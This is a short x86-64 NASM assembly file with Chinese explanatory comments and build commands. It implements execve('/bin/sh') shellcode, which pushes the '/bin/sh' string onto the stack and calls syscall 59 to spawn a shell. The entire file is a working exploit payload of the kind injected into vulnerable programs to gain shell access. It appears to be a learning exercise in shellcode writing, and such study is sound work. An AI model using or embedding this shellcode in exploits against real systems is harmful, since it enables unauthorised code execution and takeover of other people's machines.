; nasm -f elf64 -o shellcode64.o shellcode64.asm 
; ld -o shellcode64.out shellcode64.o
; execve(const char *filename, char *const argv, char *const envp)
section .text
global _start

_start:
    xor rdx, rdx           ; rdx = 0，NULL，execve 的第三个参数 envp
    push rdx               ; 确保构造下面rdi push后的截断NULL 确保不越
    ; 将 "/bin/sh" 字符串入栈
    mov  rdi, 0x68732f6e69622f   ;  将 "/bin/sh" 的 ASCII 码存储到 rdi hs/nib/ 因为入栈高到低 读取低到高 然后地位在栈顶 也是低地址处。 0x68732f6e69622f
    push rdi               ; "/bin/sh"，execve 的第一个参数 filename
    mov rdi, rsp           ; rdi 指向字符串 "/bin/sh" 的地址，作为 execve 的 filename 参数
    xor rsi, rsi           ; rsi = 0，NULL 参数argv
    mov al, 0x3b          ; execve 的系统调用号为 0x3b (59)
    syscall                ; 调用 execve 系统调用
